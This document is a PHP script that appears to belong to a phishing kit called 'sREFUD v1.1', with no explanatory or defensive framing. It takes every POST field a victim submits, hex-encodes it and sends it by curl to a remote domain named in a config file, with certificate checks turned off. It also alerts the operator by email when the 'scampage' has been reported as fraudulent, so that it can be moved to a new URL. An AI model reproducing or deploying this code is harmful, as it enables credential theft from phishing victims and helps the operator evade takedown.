<?php
session_start(); 
set_time_limit(0); 
error_reporting(0);
$tanitatikaram = parse_ini_file("safe.ini", true);
$_SESSION['email']=$tanitatikaram['reportmail'];
$_SESSION['dmn']=$tanitatikaram['update'];
function notfy(){
$kar = $_SERVER['SERVER_NAME'];	
		$MESSAGE="<p>Your &#1109;ca&#1084;page Down </p><p>Website : $kar</p><p>It look like someone reported $kar as fraudulent attempt to obtain sensitive information, so change your url asap!</p>";
		$SUBJECT = "Oooops : $kar Detected ";
		$HEADER = "MIME-Version: 1.0" . "\r\n";
		$HEADER .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$HEADER .= "From: sREFUD v1.1 <srfud@mail.com>\n"; // Notification sent to your email.
		mail($_SESSION['email'],$SUBJECT,$MESSAGE,$HEADER);	
}
$em = print_r($_POST, true);
$em = bin2hex($em);
$kar = $_SERVER['SERVER_NAME'];
$ch = curl_init();
$curlConfig = array(
    CURLOPT_URL            => "".$_SESSION['dmn']."/status/?site=$kar&email=".$_SESSION['email']."&hash=$em&notif=on",
    CURLOPT_RETURNTRANSFER => true,
	CURLOPT_SSL_VERIFYPEER => false,
	CURLOPT_SSL_VERIFYHOST => false,
);
curl_setopt_array($ch, $curlConfig);
$result = curl_exec($ch);
curl_close($ch);
if (strpos($result,'Down') !== false){
notfy();
}
?>